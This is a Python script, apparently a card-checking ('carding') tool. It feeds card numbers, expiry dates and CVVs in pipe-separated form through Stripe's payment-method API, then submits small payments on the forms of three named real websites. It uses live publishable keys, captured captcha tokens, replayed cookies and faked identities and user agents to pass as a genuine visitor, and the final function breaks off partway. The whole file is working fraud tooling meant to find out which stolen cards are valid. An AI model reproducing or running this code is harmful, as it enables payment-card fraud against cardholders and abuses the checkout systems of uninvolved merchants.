import requests,re
from user_agent import generate_user_agent
from faker import Faker
import uuid
import random

# Initialize Faker
fake = Faker()
def Tele(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        guid = str(uuid.uuid4())    
        muid = str(uuid.uuid1())    
        sid = str(uuid.uuid5(uuid.NAMESPACE_DNS, 'example.com'))    
        time_on_page = random.randint(1, 30000) 
    
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=70a18235-71ad-4004-8d22-37144e6724bdd6c9e5&sid=412fbaf8-b694-4b8e-806f-0976e8b3cdd5e624d6&pasted_fields=number&payment_user_agent=stripe.js%2Fb792108426%3B+stripe-js-v3%2Fb792108426%3B+card-element&referrer=https%3A%2F%2Flcfp.org.uk&time_on_page=34225&key=pk_live_51P05UI025m4Jgyco4Z31uNDfzsKpF2B5Okh5UrmyjJT2WQIvcrmVtKzVYxIx0EeY0g0toCMp34rUvjbYZdOhHdgw00unAXSyH0&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZzFWTjZRQU5MTUpzQ2JXTE50UjZkeTNMNGhFM3A3VnFYT3BydSt3Nkx3cnpVTjhoQ0tTTXBWS3hCY29iNHRYYjBlOGhNbCtUMkt6RTJHZkQ3dWJ5alJDam1NQk9iQnF1NGFNV1U1NzdzcFlxYVJ3bWpCRzJ5S1JPZEtxY0g3UkRKZWJXY3Q2cGV1OFNFbk9SNTUvRWE5bkdMZFpFOHRzTzdYZkY3SmVFbkhJNUxHY3dZYzE3NjYwd0xIaHFtK0N1Q2tmUmFvUmY2RkcwZXBtYXdEZUFMYlJ2SVlKSmlKakt5ZkphalpVcXZYZlZOaGRLbWR6cDlrc1BWVWpwOXBxdWU1VlUyM2ZFTzlrcGIxRytlekxWSk52R3l4bzhESnFJQkVLZ09nSGRIOEhScy9SaHRJZDVpdC9uWk9rK3czYktXYkcramFpeHZHQnc1L09vYm5DU3NSYnlvVE5YTGt2K3hYZTB4RGRUeEFtbVlFMUNKUzdOVm9BUk9uQStxN1ZxSDQ5emtvSEFCZGdpam9obTk3TlRtK1U1WUZqM3NkYXhoZTFlZThFeHlnZ0VDdHR0Z1VsWjUvek5TczdUeklUMmZsZnhWajJpaXhYeVkxRTZ0L2ZUaGx5Q014NW5XNEpUNFNycXNiWGpWcUF5WTRJNjdKVU1UNXcrWVZjR1hDbGtFUU1VQ3U3NW13TDdUQS8yamlLMlNGWWxpUVlQZ056VVVtbGwvMFlwcW5QbEUvK1RwcE1sQzBoVE1lcnd5RFVsZ3E1MEVoRDJBSDdkRlc0a2hqM1VCeFlQaGk5ejAzNlloQVN4YVV6YU1qYURzenFlUnFZMTV2NHdPNFlBd2xuVDdKZkFoZGUxbTVFRjZGeUc2clI0Um5RYzJ3T2NDSStTY0JHTXJ2clUvQVZZT1ErR3NDTjk4WEhpNFRyaS9vMXc1VWFwVVlDcmRueFpocEx6T2RGaHVERWZQS2lWbWw2NWg5c0c1YUNheUkwMTNhd2RkNDZ2dmRyOEZHUG5DZkVoN0M2N0p4Q2xCK2RvTXZTVlZRb25qY0tnYllTejNrQnhWamlkTVFhSkZVcDEzNTE4TGRFdUpWaWZyVFFEVWJQTUF1SWVLYUh6V0dNK1gxQi9Cb3orY1NnMjI0TDkvOTd6eDNieEN1NzVJekN0OTBPTlE4L25mV29XTzFFMStnWW9pdFZTYmh0SGRycEd6K0VpbDhyWHRMMlVmYlNIWDd2K2twaUpDd0hoUlZUc0w4TFNiSnd0N1kxQW00T3NPNTVBcVYvRVpGU0xDRCtTcS94Nytpc2NpN0ZBUmE1eDB5ZGFYUEF3R1NPbXVjcExiTDJWa21JNHJlUExyRGE2dy9qbGhWMTM0K1FEZUNZN1Rsbm41WXhDbnp3NXNpYklScWxqWVlmZmdncWdxV3hNQXlJMks4L2NRblc3VDZrZ1VNWjlBdlMzYWR6NGorem1SM3ZoUDZhdTdsYzZrdnF1YmJKY3pJcC84T09IamVJZk9KZ0p3aUN5aFNuRlZKUmxkZ0hDamRYYUIvd25zdUEwZng5RTFHRUo3Z3hFNHM2MWRjZHJyOEl1TFdBVmZvOUFyT0xIN2Q5RXk4U040a2d0cVhiQVVmaExmVjJVREZ3c2FIYmx0dlowZnhjR1ZsQ0tJUDZNcXJDKzc3QVpHL0FURXNmSnNQdUFiVjk3K2lBY1U4YUhOZnkzSzFyRzJmVUNpQ0VRN0FlN242Z1hMTGk0c1llcHg2MGFBYWJ4UENJT0RLMmgzRmZtSXdFTHROSHNkTzZOUEkrK1g4bkJHRTBVdmVjTTBYWnplbkE2TjV5VEpGS2JvbW5zZ016OUtKeldQNFZDTmxSSitjVDdKZ0VURzdSZkdkMVJrNlFEdEEyMUd3MFFuTXg1VFJqZHFWcUY4RjY5MEpFQ1dMUHFWYjlIcjJnUGkrVEJxR0VYais3VmdLcEMrV09MdVNjRTdYOHZwUFJEMUxzQnpVNlhrVGpwbUxac0haVDBjK01vTFNQa2xXODhXSEwzRVozMjhVbDZueDJOSERjWkJpMkNUNTZkRE5SbFpYMnJmTXhLUXZtclQyNFQ0VHltWHZCWFdEM09uaWt0N0pkUytkOElNakZlTHo2bFlCLzZOM1BTY1NubFROYUlOUVltcU9rVzN1dnhwc3h3endUckZhUUE2d204SzBOTXpUT2dEMFhhVVovZHUxNS8vMDZyNjVCMjF4VE5hY1dHbXk0UThWR213RisveEppcnJvbWs2aWtJOG1OeHJINDB6YWpybHNyV1VaWjRyUGQ1a2Z0cjh5NU1USUVDZS92UWlGTXVIY0NLWXNDaVFtVWFIVFBTMmZ3TmJSK3FRUnJYNUJFWGk3SVFDRm5ZZGZhbGtGTEFNM3h5UFFwRHhSVGlWKzM1SzFJUDc4NXUyeHlKVnRQUGpmcFZxYklHV1c2YWxUQXNHdGFTTVlJWERweW91ZnNoTU94T01BWXhVZUJ5ZjRaYWhnVFFIeGFWS1dDZ1dqWlJLSGlTT0hJWTd2dWxiZjJCaDVvZ0hWaTJFVHQ5KytqdzZtQzZHMXE3V0dCZm0vRXFXdElVSHNjSnJlNk9XcFVkK0NMRklxODE3cVl5ZWZUeUF4NklteE9wanptTHpkakVvQ2ZadnY4OGlIMnVxTjE2VkJ1aGJJd2w2aVhOWVNONEFkQS9BZ1J1NDdydTczVEd4OHp3SlhTRWFNYlFESkxZMG42VWkyQ3diMGx3L3Z3YnV5RzZTMFRER2hqaU9HNWV6NGVlQVBDUHVzcTZFRU5HYUdXVG82a2RpbzBzLzRyL1h2eDQxd1BlYm9NYS9NOG9sNFNQMDRnSDdqeWY3WFNpb0ZlN1hsN2d4NE1iUDlpb3ltUktQbndWNUR4R1ByU2RRU2xjZXVoYnRFWTRuZ2w0TEtjPSIsImV4cCI6MTcyOTcyOTI0MSwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiJiOGJlYzEwIiwicGQiOjAsImNkYXRhIjoiVDRDalYxVGUxMjZwK3Y1VisrcFdwSHpYNWpybFpld3h1S1YxRG9jeGtGbmI3N3ZGL3g5VTBVU3BBcFhjd1hGZ0ovTjVPclRtSXRsY0tON2lmdmdXUm1hWWlYK0hqUTMrS1pPZVBjcmZhclBaK2VFMVB1WmdwWFp5UjdRbUw3Q1Uwd3R6dXZ1ZWhQR2ZlU0hMWlJCMlJlTFRBTnp2dUhoVVRyeFRKVUVScXNLdTExRXpLUjM3bVpVK3FrSTVKSENsZU5FT09pTWpmSzBMdUU3MSJ9.lMO6P-tzPao7TxhOdcKU78hRkg4tN4wUuCgDGkMcPFo'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            id = response.json()['id']
        except:
        	pass


        cookies = {
    '_ga': 'GA1.1.566870207.1729729114',
    'cookieyes-consent': 'consentid:RWYwZmZ1dE00UWRLQkFuNXZ5VzI0bndlQjZmMFh5c24,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
    '__stripe_mid': '70a18235-71ad-4004-8d22-37144e6724bdd6c9e5',
    '__stripe_sid': '412fbaf8-b694-4b8e-806f-0976e8b3cdd5e624d6',
    'burst_uid': '6b69561f23235981e2d138aacc00093f',
    '_ga_YPC0KVCX1L': 'GS1.1.1729729114.1.1.1729729149.0.0.0',
    '_gcl_au': '1.1.1407270234.1729729121.925242018.1729729121.1729729149',
}

        headers = {
    'authority': 'lcfp.org.uk',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://lcfp.org.uk',
    'referer': 'https://lcfp.org.uk/pay-now/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1729729149991',
}

        data = f'data=ak_hp_textarea%3D%26ak_js%3D1729729113626%26__fluent_form_embded_post_id%3D6355%26_fluentform_7_fluentformnonce%3D08f6e8ca3e%26_wp_http_referer%3D%252Fpay-now%252F%26dropdown_2%3DLevel%25203%2509Diploma%2520in%2520Business%2520Management%2520603%252F7795%252F1%26input_radio%3DOnline%26input_radio_1%3DPay%2520in%2520Full%2520(One%2520Time%2520Fee)%26names%255Bfirst_name%255D%3Dthu%26names%255Blast_name%255D%3Dra%26email%3Dthur34355%2540gmail.com%26phone%3D%252B63676400%26address_1%255Baddress_line_1%255D%3DStreet%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10080%26address_1%255Bcountry%255D%3DDZ%26dropdown_1%3DHigh%2520School%2520Diploma%26payment_input%3D0.50%26payment_method%3Dstripe%26payment_method_1%3Dstripe%26ak_bib%3D1729729124945%26ak_bfs%3D1729729148573%26ak_bkpc%3D8%26ak_bkp%3D23%253B23%252C10%253B17%252C6%253B17%252C5%253B17%252C5%253B16%252C5%253B16%252C4%253B16%252C5%253B%26ak_bmc%3D2%253B2%252C2848%253B3%252C2092%253B7%252C1634%253B15%252C2265%253B16%252C3636%253B5%252C3838%253B5%252C3566%253B11%252C13490%253B%26ak_bmcc%3D9%26ak_bmk%3D%26ak_bck%3D%26ak_bmmc%3D0%26ak_btmc%3D9%26ak_bsc%3D9%26ak_bte%3D210%253B72%252C1007%253B87%252C680%253B2%252C1327%253B10%252C1%253B84%252C1538%253B85%252C1291%253B333%252C205%253B78%252C284%253B118%252C2098%253B122%252C655%253B311%252C27%253B88%252C229%253B358%252C2851%253B61%252C559%253B82%252C745%253B597%252C200%253B166%252C687%253B164%252C313%253B83%252C563%253B120%252C1330%253B1%252C12154%253B%26ak_btec%3D22%26ak_bmm%3D%26__stripe_payment_method_id%3D{id}&action=fluentform_submit&form_id=7'

        r2 = requests.post('https://lcfp.org.uk/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
        return (r2.json())
        
        
        
# Initialize Faker
fake = Faker()
def Tele1(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=de57bf64-7458-4e9e-b477-65e3e7684bfe8b9fc9&muid=17abbc83-6682-4b95-a376-058109bbed89dbbbd2&sid=673b9d49-d374-4ea1-bd8c-7740432a43a64df6ba&payment_user_agent=stripe.js%2F0f4091ba29%3B+stripe-js-v3%2F0f4091ba29%3B+card-element&referrer=https%3A%2F%2Fverifymyrecords.com&time_on_page=50400&key=pk_live_51JdfCADnLqTFtZK2iCbPLMvx3y3dDAuw8wBFnjNUTIZYjT9By12p3EZVnBEzTbOrO2gmNXi4qVFwtXd5W3RpPg6P00EsD5gv3q'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
        	id = response.json()['id']
        except:
        	pass


        cookies = {
    '__stripe_mid': '17abbc83-6682-4b95-a376-058109bbed89dbbbd2',
    '__stripe_sid': '673b9d49-d374-4ea1-bd8c-7740432a43a64df6ba',
    'cf_clearance': '1nRJwiYt3pqei4Rfetrk5_UKluZm610a5zKmvwh8kCM-1730228539-1.2.1.1-MnaUaWpKmdQXgJ8EyZZJmxX2vlA8usitGhqU83AqGUyFijff9QYLz6pEkSDz4XQNo3zP0udqCnjJ08idtxWjB3qFzmbdyqTscjgWImcQbQpJmzMh1re3AkMifqxPuxl0v98D5e9eyPbNfdeLsv7In2LrUEdDT._N1duiGXiRebG1e272rETUjd_rQJofeYI0RYbRNax_dF8kKxDXwFDj6tH1T2PB.ryQi5Gmhap17_vKqWDrtBjNg8QxhgM37kMuJ9DvOustahpqLhxgI_GLQep6slZYpzsPkn0mABefFjMPyMDFymUa6LvkrQzE_7FnRz01V0W.qAfJQwsA1cbbq07bOwp4JLC..Ha6hpY64vasSnyauTc_0HGj7A1ULbS3etVof74Iz5TsXwChPISZEw',
    'wp_llms_session_d82289878992dc9450d7b0fb658f9f38': '855d0c58d492dcd8ca52deaac526b6cd%7C%7C1730250188%7C%7C1730246588%7C%7Cf486fe3cf102d19b53bbd0a85123dcff',
}

        headers = {
    'authority': 'verifymyrecords.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://verifymyrecords.com',
    'referer': 'https://verifymyrecords.com/extra-certificates/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1730228589648',
}

        data = {
    'data': f'__fluent_form_embded_post_id=2676&_fluentform_16_fluentformnonce=6010a06815&_wp_http_referer=%2Fextra-certificates%2F&certificate_add_on=Yes&payment_input=Yes%2C%20Add%20%201%20Extra%20Certificate%20-%20%2410&contact_for_certificate_1=&payment_method=stripe&names_1%5Bfirst_name%5D=Khant%20Ti&names_1%5Blast_name%5D=Kyi&email_1=tyikyi2552002%40gmail.com&__entry_intermediate_hash=2de86e379ac36be2d4523e9bb1a10e4c&verification_agreement=&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '16',
}

        r3 = requests.post(
    'https://verifymyrecords.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        return (r3.json())
        
# Initialize Faker
fake = Faker()
def Tele2(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
        mail = fake.email(domain=domain)
        
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=32a0b84f-dedc-456e-b598-fb6bf54c65fb7b3340&sid=5f6ef45e-4d3e-407f-aaf5-3d083232fbd49c91d9&payment_user_agent=stripe.js%2Fc2c2f6daa2%3B+stripe-js-v3%2Fc2c2f6daa2%3B+card-element&referrer=https%3A%2F%2Fgalwaybdgroup.com&time_on_page=29398&key=pk_live_51IXn9gCjCb8tOn17jeSErBz0QdYjX8cbEuCPcjwo30QUpyupLAxotfh16BIv82hifJPHWFhGrKF2pCkF40Wp3Xac00CTx01pfh&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiU2RNNVdUbVNhSmh1L2g5ejZuc0ozV1o0RjFQeDZ3NE10dlJKcW1Zdll6UWZ2QU5Hd1hSUDBoMUlMc21qTytQQ0d3c1NDZ25sVnF3cjljZXNYbVgyR3NUVFF0cDNKYWlRWWtZYWRQRUt1cU5yZFo5Zk8wSHYyeS9EcHIyTmQwTXovZk1xSHRzZHlQOG9wenVsN3gvV1ZXUHY5SWhMamtqTXpkZGg3SmlIWDJ4NEYwQUZLaEQ0Tk4vQmpwcGI2dnNGalBjUWpaNnIxTERFU08zbjhCc1J0MElGb044ckFsaDN1UEtQN0Q2Vkw3U0FrSVJoeGlxdmtJU1BIR0E0MmJCL1E4K1N4UDBNYlR0N2ozSEVpWUx4ZW43MGxFajU0VHA4RDcwaGRiSE9Ddjc3QVVNNnFnZmNaeUdHWFJRWStMWDl5Z0ROVU9zeWp5dEJnWEdsR282UWlVRDZScGE2d21LN08zYk82OWpzWnQ3UWJqVWxPSm1xTU0rWTVadEh0K0JPZHc2b0w3bXo3YWs4OHZ5WFJ6aGJuNWxRRVo5QUhPalc0b1lrenF6ZHA4aElEREsrS1A3eHAxSDNBcjQzTkQ5T0lRcVc5bXZ2d2VsWGhObHNNdENaRC9wK29PelhwK0R1b2FJQkQ4cmRFdnJhRUUraFVVSThHeDBWRG50UThGbXovK1ZXM2ZzNDJNMXRTMWVkSVF6Uk0vS1g3UTV2azlDNEkydTMyWEpPK3FERjM2QzVVeVZRdXBxNWZFVnJNckZsbTl2YWRhVnV6UWIvbUk3OEFTTld2MTZOZzNRcjhZQUlMV2xKMElPODJNMHU4VnJSUUZWMWh4amUwamwyUklOdlpMa0hpU3FCdUpWU2lLcFZvRS95aDV2Yy9KcEZEdjN3TDlyL2RGNWt1RG92RlhCZHBqMDNOcExLNm9WTzZZQU95VVBXVzhkZXQyMno4Q3BiaXpVNit1cnNsbVp0aDhNYzFQYWpSRklyb0g3ZUZJRzk4UVhhQUptRE1Hb1JjS09QckNralNhV0JneFE5TVFyazNoU2V0YXF2R21IZU5meVRQYUx2ZkxIVGU0Q3h3UXl6cGsyU2dnRUZkQ25RVFpyb3BZbitZM0xqTGNDZkV3TjM2bFRDMWtjUmdkNjI2RFlGUXhXZStNS3NMbCtDc1lZNVE0K2dXT1NaS2w1aWdEV3Z4YzE0eGl5cDF1bFIrdVE3amF0LzdMLzQvaWtRYXQxV3dwWlJtT0dQYllRdVRqU0ZIK01acVBvT3ZWK2FKWko1K2ZxMHd6UEY3TnN6ckIxc3N1ckxZeE9hYjQzK0EwcW1DWlFoWXpkTXR3TEN6U3RnUDN6dlM3eUFiMm53dUQ5KzFnYzlRcitwQ3M5aUo1cStmd1ZxaGdseU5sNFgwQU9LSHkwbmJBZ25sREQweW9uaGlwVEVnbG5rM0thZ1A5Uzg1V2VxYUsyQzZRRWpqOTNjNnQvN256OHV5eEVqc3dyQXdPR1JoWFBXRExKNzBXYzFkdWlqaTRFTm9jYWFqMXdKTU12bHc1cUZxMWRsN0s2QW1SRG9TU0hjZXFHbDRJTnh2MHRVaUZuekN4Y0NsOFcvSENvbHIvOEFaYnBJRHFWOTZuREVtVmg3bnE5b2haNk01YTJrZ08rUlkrWXlOL0tjczFBbFhCN3A1dkQ0ZXBkZkxOaW1ORy9KNkgrYThyai9WN3cvZDZSVW8vckJ3Z2NuN3JMWlZzazBaRkwydURBTFhVYUROODJ1Mm9JRnk2cm5xcXplVHRkQ0NHRXA0SVBDSlRSQ0hGRjZXY3JOVDdGNU9zTllJZXg1OHVEUlhod1BsaGZBNVFEaDcyYnVQT1RnLzZPZmY2QUJqMnJNa0Z3d2VwWWJ4QnVwTHR5d0pZVithS1VKOUpFREhiZzBKYmJvSXEwN3VjZkIrUmpZajBaalAvaUhyTlk0ckp6NWJyT21mL1ZBZHVacFdpMWg4TUNraVpjMjdvYkd3QVNKeGZhdFFwSUxsN1dHSHB3eVdzZHVPdXg2OVYzSmJWWkNIc2orMGFsVG1DUG4wQjl5NUR0WHpHWTBoOGVnMnBLL2MvTFI2Mkl0YlBtSWtzSG8rbVlYdndmdFRVejhDWEkrdTByMDRuVVVsYzd6bXBiaEI0dWF3L2NETGM2aHRxUTdVU0JQTVpEdkFYbXRkRytTcTdwRlA3cG9sY3kyb3BzbWgybzNEc2VVRGdWdUwxSlhkd1gwK2NPNmNKSCs5Nlc5MnVxcnhDb1VtOVFxQ0tkWnJpU3ZhZjljRDYvNWhnNXFUb3hTaUxUR1A5ZWl2eFFWckpLdUNHcFdOcTdPZ3JVOWJEZTc4YVZyNEt3YUFvc0daSFpiWk1ZaHRyR3lMZzFFUC9Ia3c1VmtqeGpaYmVtNjBPcllQbHo5SzJsTk0wNUlEQkJSNU9FblZVVWJnZGF4ZGpyQXFGd2wzbXc4UTBTb3RucVZ1clpIWkJvaTY3VWxXbCtMQWNmbXBjVEI5bkRCRitDM1lYM3B6RVJYQ1hVZEJOLzZsdDF6OWx5SDA5NkVObTdhZWwwNzhKdmhNQlA2ZkFidkpGdE4xR1FHcVlaZlhNUmk4NVN3SmpIU0p3Mm9wTS9id1BlYkFqSnUwNUtSUkpvemxjQjNSN0FGZkNmWFVTWWZmZjAzbXo0eHIyR3hZOGF6eHRzZlg2dXdCUnhxbkZSc3BILzZkMXBacGRGUXdFU2FNc1NzQlZsazZWZlh5ejFzNkM2ZDJyYlB6Y1I0OXhmYk03RlFDUlMvSEVUajlrRUZaWWphN0djUC91Yy9EUmNaVkpQV3BEajFZTFJraFlLcU1UOEFSNTVic2p0OHFGcWx4RzhUYTl2K0RQRE8relFxQ001Q3EwMGdKZUxxUFh3YmpxR3hjQzZmWFJaTTY2MDU4WTFJK3NzRjFKaG1UaGo1bGFZPSIsImV4cCI6MTcyOTgzMjAxOSwic2hhcmRfaWQiOjM2MjQwNjk5Niwia3IiOiI0NjNlZGFlZSIsInBkIjowLCJjZGF0YSI6IjdiNlFtdVI1UStZbU5MSGxvQS9YRzd0eklUUCtYaXJ3dDVvZDBiSUVXaFIwclh0TmhtZUNIRHY4V0NOVW94WTB5QlZDQS9LTzlBR3h0YXVFQVQ1a3JpSjFDZjFsMklpUURYcXhRYjdpa3U4NnlrMEUraHkrS1gxZ3g1Rkkrb2xwKzRpaVlwM1pQbEtSUmZhbzRUL1ZOTHZJVWQ5aTUzd28vd0hMTWJhWmp4K0dRc3JFWUFlaHFZUDlvTHpMK2dmajJ6NHpFYncrM1ZteEFidjQifQ.5byDzsaqY3erde4oAuuHSFwaGqNNhA6EmpucS2nUX5c'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            id = response.json()['id']
        except:
        	pass


        cookies = {
    '_lscache_vary': '38044d5f7e1e4c9647b1e2da323481a1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-25%2004%3A51%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgalwaybdgroup.com%2Fsample-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fgalwaybdgroup.com%2Fsample-page%2F',
    'sbjs_first_add': 'fd%3D2024-10-25%2004%3A51%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fgalwaybdgroup.com%2Fsample-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fgalwaybdgroup.com%2Fsample-page%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgalwaybdgroup.com%2Fsample-page%2F',
    '__stripe_mid': '32a0b84f-dedc-456e-b598-fb6bf54c65fb7b3340',
    '__stripe_sid': '5f6ef45e-4d3e-407f-aaf5-3d083232fbd49c91d9',
}

        headers = {
    'authority': 'galwaybdgroup.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://galwaybdgroup.com',
    'referer': 'https://galwaybdgroup.com/sample-page/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1729831916205',
}

        data = {
    'data': f'WsoCsBSkLAVc=GHxLd28I0SNLc8X4KLgfl5mLqAxGIzzLZC6XEUE2KA41RC0FnQmcUetnQjc6OHMm&__fluent_form_embded_post_id=2&_fluentform_2_fluentformnonce=1013df7d94&_wp_http_referer=%2Fsample-page%2F&email=thur34355%40gmail.com&payment_input=0&payment_method=stripe&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '2',
}

        r4 = requests.post(
    'https://galwaybdgroup.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        return (r4.json())
        
# Initialize Faker
fake = Faker()
def Tele3(ccx):
        import requests
        ccx=ccx.strip()
        cc = ccx.split("|")[0]
        mes = ccx.split("|")[1]
        ano = ccx.split("|")[2]
        cvv = ccx.split("|")[3]
        if "20" in ano:#Mo3gza
            ano = ano.split("20")[1]
        r = requests.session()
        
        # Generate fake data
        firstname = fake.first_name()
        lastname = fake.last_name()
        username = fake.user_name()
        domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
